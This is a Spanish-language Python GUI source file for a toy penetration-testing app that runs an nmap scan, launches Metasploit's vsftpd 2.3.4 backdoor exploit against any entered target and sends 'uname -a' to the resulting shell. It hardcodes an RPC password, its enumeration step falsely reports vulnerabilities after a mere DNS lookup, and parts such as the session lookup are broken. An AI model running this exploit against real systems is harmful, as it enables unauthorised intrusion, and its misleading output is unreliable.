import tkinter as tk
from tkinter import messagebox
import requests
from bs4 import BeautifulSoup
import nmap
import socket
from metasploit.msfrpc import MsfRpcClient

client = MsfRpcClient('msfpassword', server='127.0.0.1', port=55553)

# Verifica que te hayas conectado correctamente
print(client.call('core.version'))


class PentestingApp:
    def __init__(self, root):
        self.root = root
        self.root.title("Pentesting con Estilo de la Legión Española")
        
        # Establecer dimensiones de la ventana
        self.root.geometry("800x600")
        
        # Fondo con colores de la Legión Española (amarillo y rojo)
        self.root.config(bg='#FFD700')
        
        # Agregar un menú principal
        menubar = tk.Menu(self.root)
        
        # Menú de fases del pentesting
        fases_menu = tk.Menu(menubar, tearoff=0)
        fases_menu.add_command(label="1. Reconocimiento", command=self.reconocimiento)
        fases_menu.add_command(label="2. Escaneo", command=self.escaneo)
        fases_menu.add_command(label="3. Enumeración", command=self.enumeracion)
        fases_menu.add_command(label="4. Explotación", command=self.explotacion)
        fases_menu.add_command(label="5. Post-explotación", command=self.post_explotacion)
        menubar.add_cascade(label="Fases de Pentesting", menu=fases_menu)
        
        self.root.config(menu=menubar)
        
        try:
            # Intentar cargar una imagen de logo (asegúrese de tener una imagen en el directorio correcto)
            self.logo = tk.PhotoImage(file="legion_logo.png")
            logo_label = tk.Label(self.root, image=self.logo, bg='#FFD700')
            logo_label.pack(pady=20)
        except Exception as e:
            print("No se pudo cargar el logo:", e)
    
    def reconocimiento(self):
        new_window = tk.Toplevel(self.root)
        new_window.title("Reconocimiento")
        new_window.geometry("600x400")
        new_window.config(bg='#FFD700')
        
        label = tk.Label(new_window, text="Fase de Reconocimiento: Recopilación de información", font=("Arial", 14), bg='#FFD700', fg='#8B0000')
        label.pack(pady=20)

        info_label = tk.Label(new_window, text="Ingrese el dominio o IP objetivo:", bg='#FFD700', fg='#8B0000')
        info_label.pack(pady=5)
        
        target_entry = tk.Entry(new_window, width=50)
        target_entry.pack(pady=5)
        
        def start_recon():
            target = target_entry.get()
            url = f"http://{target}"
            try:
                response = requests.get(url)
                soup = BeautifulSoup(response.text, 'html.parser')
                title = soup.find('title').get_text()
                result = f"Información recopilada para {target}:\n- URL: {url}\n- Título de la página: {title}"
            except Exception as e:
                result = f"Error en la recopilación de información: {e}"
            result_label.config(text=result)
        
        start_button = tk.Button(new_window, text="Iniciar Reconocimiento", command=start_recon)
        start_button.pack(pady=10)
        
        result_label = tk.Label(new_window, text="", bg='#FFD700', fg='#8B0000')
        result_label.pack(pady=10)
    
    def escaneo(self):
        new_window = tk.Toplevel(self.root)
        new_window.title("Escaneo")
        new_window.geometry("600x400")
        new_window.config(bg='#FFD700')
        
        label = tk.Label(new_window, text="Fase de Escaneo: Identificación de puertos y servicios abiertos", font=("Arial", 14), bg='#FFD700', fg='#8B0000')
        label.pack(pady=20)
        
        info_label = tk.Label(new_window, text="Ingrese el dominio o IP objetivo:", bg='#FFD700', fg='#8B0000')
        info_label.pack(pady=5)
        
        target_entry = tk.Entry(new_window, width=50)
        target_entry.pack(pady=5)
        
        def start_scan():
            target = target_entry.get()
            nm = nmap.PortScanner()
            try:
                nm.scan(target, '1-1024')
                scan_info = nm.csv()
                result = f"Resultados del escaneo para {target}:\n{scan_info}"
            except Exception as e:
                result = f"Error en el escaneo: {e}"
            result_label.config(text=result)
        
        start_button = tk.Button(new_window, text="Iniciar Escaneo", command=start_scan)
        start_button.pack(pady=10)
        
        result_label = tk.Label(new_window, text="", bg='#FFD700', fg='#8B0000')
        result_label.pack(pady=10)
    
    def enumeracion(self):
        new_window = tk.Toplevel(self.root)
        new_window.title("Enumeración")
        new_window.geometry("600x400")
        new_window.config(bg='#FFD700')
        
        label = tk.Label(new_window, text="Fase de Enumeración: Identificación de vulnerabilidades específicas", font=("Arial", 14), bg='#FFD700', fg='#8B0000')
        label.pack(pady=20)
        
        info_label = tk.Label(new_window, text="Ingrese el dominio o IP objetivo:", bg='#FFD700', fg='#8B0000')
        info_label.pack(pady=5)
        
        target_entry = tk.Entry(new_window, width=50)
        target_entry.pack(pady=5)
        
        def start_enum():
            target = target_entry.get()
            try:
                ip = socket.gethostbyname(target)
                result = f"Vulnerabilidades encontradas en {target} ({ip}):\n- Enumeración básica completada"
            except Exception as e:
                result = f"Error en la enumeración: {e}"
            result_label.config(text=result)
        
        start_button = tk.Button(new_window, text="Iniciar Enumeración", command=start_enum)
        start_button.pack(pady=10)
        
        result_label = tk.Label(new_window, text="", bg='#FFD700', fg='#8B0000')
        result_label.pack(pady=10)
    
    def explotacion(self):
        new_window = tk.Toplevel(self.root)
        new_window.title("Explotación")
        new_window.geometry("600x400")
        new_window.config(bg='#FFD700')
        
        label = tk.Label(new_window, text="Fase de Explotación: Ejecución de exploits", font=("Arial", 14), bg='#FFD700', fg='#8B0000')
        label.pack(pady=20)
        
        info_label = tk.Label(new_window, text="Ingrese el dominio o IP objetivo:", bg='#FFD700', fg='#8B0000')
        info_label.pack(pady=5)
        
        target_entry = tk.Entry(new_window, width=50)
        target_entry.pack(pady=5)
        
        def start_exploit():
            target = target_entry.get()
            client = MsfRpcClient('msfpassword')
            exploit = client.modules.use('exploit', 'unix/ftp/vsftpd_234_backdoor')
            exploit['RHOSTS'] = target
            exploit.execute()
            result = f"Explotación iniciada en {target}"
            result_label.config(text=result)
        
        start_button = tk.Button(new_window, text="Iniciar Explotación", command=start_exploit)
        start_button.pack(pady=10)
        
        result_label = tk.Label(new_window, text="", bg='#FFD700', fg='#8B0000')
        result_label.pack(pady=10)
    
    def post_explotacion(self):
        new_window = tk.Toplevel(self.root)
        new_window.title("Post-explotación")
        new_window.geometry("600x400")
        new_window.config(bg='#FFD700')
        
        label = tk.Label(new_window, text="Fase de Post-explotación: Obtención de persistencia y limpieza de evidencias", font=("Arial", 14), bg='#FFD700', fg='#8B0000')
        label.pack(pady=20)
        
        info_label = tk.Label(new_window, text="Ingrese el dominio o IP objetivo:", bg='#FFD700', fg='#8B0000')
        info_label.pack(pady=5)
        
        target_entry = tk.Entry(new_window, width=50)
        target_entry.pack(pady=5)
        
        def start_post_exploit():
            target = target_entry.get()
            client = MsfRpcClient('msfpassword')
            session = client.sessions.list.keys()[0]
            shell = client.sessions.session(session)
            shell.write('uname -a')
            result = shell.read()
            result_label.config(text=f"Post-explotación en {target}:\n{result}")
        
        start_button = tk.Button(new_window, text="Iniciar Post-explotación", command=start_post_exploit)
        start_button.pack(pady=10)
        
        result_label = tk.Label(new_window, text="", bg='#FFD700', fg='#8B0000')
        result_label.pack(pady=10)

if __name__ == "__main__":
    root = tk.Tk()
    app = PentestingApp(root)
    root.mainloop()
